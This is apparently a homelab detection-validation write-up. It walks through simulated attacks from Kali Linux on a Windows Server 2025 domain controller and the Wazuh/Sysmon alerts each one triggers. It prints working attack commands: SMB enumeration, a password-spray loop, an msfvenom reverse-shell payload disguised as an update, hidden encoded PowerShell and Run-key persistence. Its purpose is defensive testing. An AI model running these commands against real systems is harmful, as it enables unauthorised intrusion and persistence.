# Guide 04: Offensive Testing & Detection Validation (Kali Linux -> Win-DC01)

**Date:** November 20, 2026  
**Attacker Machine:** Kali Linux (`192.168.56.101`)  
**Target Machine:** `Win-DC01` / `DC-COMPANY` (`Company.local` – `192.168.56.10`)  
**SIEM Platform:** Wazuh (with Sysmon & Real-Time FIM `syscheck`)

---

## 🎯 Objective
Simulate realistic adversary behaviors across multiple MITRE ATT&CK tactics from **Kali Linux** against **`Win-DC01`** to test, trigger, and validate **Sysmon**, **Windows Security Auditing**, and **Wazuh FIM (`syscheck`)** detection rules.

---

## 🛠️ Phase 1: Reconnaissance & SMB Enumeration (MITRE T1046 / T1135)

**Commands Executed (Kali):**
```bash
nmap -sC -sV -p 53,88,135,139,389,445,3389 192.168.56.10 -oN nmap_dc01.txt
netexec smb 192.168.56.10 -u '' -p '' --shares
```

**Findings & Defensive Controls Verified:**
* **Target Identification:** Enumerated hostname **`DC-COMPANY`**, Active Directory domain **`Company.local`**, and OS **Windows Server 2025 (Build 26100)**.
* **Hardening Controls Verified:**
  * **SMB Signing Enforced (`signing:True`):** Mitigates SMB NTLM relay attacks.
  * **SMBv1 Disabled (`SMBv1:None`):** Protects against legacy SMB exploits.
  * **Share Enumeration Blocked (`STATUS_ACCESS_DENIED`):** Prevents unauthenticated users from listing domain shares (`SYSVOL`, `NETLOGON`).
* **Security Observation (`Null Auth:True`):** SMB null session authentication succeeded (`[+] Company.local\:`) at the protocol level, generating an `ANONYMOUS LOGON` (`Logon Type 3`) network event.

<img width="1564" height="856" alt="04 - Recon Findings" src="https://github.com/user-attachments/assets/fd7397a2-1a93-4104-a227-80887c6274cc" />

---

## 🔐 Phase 2: Controlled SMB Password Spraying (MITRE T1110.003)

**Commands Executed (Kali):**
```bash
printf 'Password123!\nWelcome2026!\nWinter2026!\nAdmin1234\n' > passwords.txt
for p in \$(cat passwords.txt); do smbclient -L //192.168.56.10 -U "Company.local\\Administrator%\$p"; done
```

**Troubleshooting & Protocol Note:**
* Initial spray attempts with `netexec` and `hydra` (`smb://`) encountered timeouts/protocol errors due to **Windows Server 2025's** hardened SMBv3 + NTLMv2 enforcement.
* Pivoted to `smbclient`, which natively negotiates SMBv3 + NTLMv2, executing 4 controlled login attempts (`NT_STATUS_LOGON_FAILURE`) without triggering the domain account lockout threshold.

<img width="1605" height="562" alt="04 - Hydra PW Attempts" src="https://github.com/user-attachments/assets/e4a76cca-21f3-49d0-a69c-f7ed25124953" />

**Wazuh SIEM Detection Verified:**
* **Wazuh Rule `60122` (Level 5):** *Logon Failure - Unknown user or bad password* (4 consecutive alerts logged between `23:06:32` and `23:06:38`, capturing Windows **Event ID 4625**, `Logon Type 3`, and attacker IP `192.168.56.101`).

<img width="1713" height="1252" alt="04- Wazuh Detection of failed attempts" src="https://github.com/user-attachments/assets/32bb294b-8d0b-4dfa-bc6c-9366e886e6a0" />

---

## 📂 Phase 3: Payload Drop & File Integrity Monitoring (MITRE T1105 / T1565)

**Commands Executed:**
```bash
# Kali: Generate test payload & host via HTTP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o update_patch.exe
python3 -m http.server 8000
```
```powershell
# Win-DC01: Pull payload & tamper with hosts file
Invoke-WebRequest -Uri "http://192.168.56" -OutFile "C:\Users\Public\update_patch.exe" -UseBasicParsing
Copy-Item C:\Windows\System32\whoami.exe C:\Users\Public\test_drop.exe
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`n192.168.56.101 internal-portal.company.local"
```

**Wazuh SIEM & Endpoint Detection Verified:**
* **Endpoint Prevention:** Windows Defender immediately detected and quarantined `update_patch.exe` upon download.
* **Wazuh Rule `92207` (Level 12):** *Executable file dropped in Users\Public folder* (`Sysmon Event ID 11`).
* **Wazuh Rule `92213` (Level 15):** *Executable file dropped in folder commonly used by malware* (Critical-severity Sysmon detection).
* **Tuning Observation:** Identified `Rule 61640` (*Sysmon - Suspicious Process - explorer.exe*, Level 12) firing on benign Explorer activity—flagged as a candidate for allowlist tuning.

<img width="3423" height="1173" alt="04- Alert on Wazuh " src="https://github.com/user-attachments/assets/ad4ff909-4e8e-4fd0-96ef-0eebc68a8860" />

---

## ⚙️ Phase 4: Encoded PowerShell Execution & Registry Persistence (MITRE T1059.001 / T1547.001)

**Commands Executed (`Win-DC01`):**
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc dwBoAG8AYQBtAGkA
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterService" /t REG_SZ /d "C:\Users\Public\test_drop.exe" /f
```

**Wazuh SIEM Detection Verified:**
* **Wazuh Rule `92066` (Level 4):** *`whoami.exe` binary in a suspicious location launched by `powershell.exe`* (`Sysmon Event ID 1` process creation tracking parent-child execution from Base64-encoded PowerShell).
* **Registry Persistence Monitoring:** Verified `HKCU\...\Run` modification telemetry and restored all modified files/registry keys during post-test cleanup.

<img width="3427" height="1143" alt="04 - Rule ID 92066_Rule ID 92213" src="https://github.com/user-attachments/assets/09edfde7-d01e-43aa-ad2b-410f568410d3" />

---

## 📝 Key Lessons Learned
1. **Defense-in-Depth Validation:** Testing against Windows Server 2025 demonstrated how enforced SMBv3/NTLMv2 signing blocks legacy attack tools, while Windows Defender + Sysmon + Wazuh FIM provide layered prevention and detection.
2. **High-Fidelity Sysmon Detections:** Sysmon Event IDs `1` and `11` mapped directly to high-severity Wazuh rules (`92207`, `92213`, `92066`), catching payload drops in `C:\Users\Public\` and encoded PowerShell child processes immediately.
3. **Ongoing False-Positive Tuning:** Observing benign triggers like `Rule 61640` (`explorer.exe`) reinforced that SIEM tuning is continuous—even after initial baseline filtering.
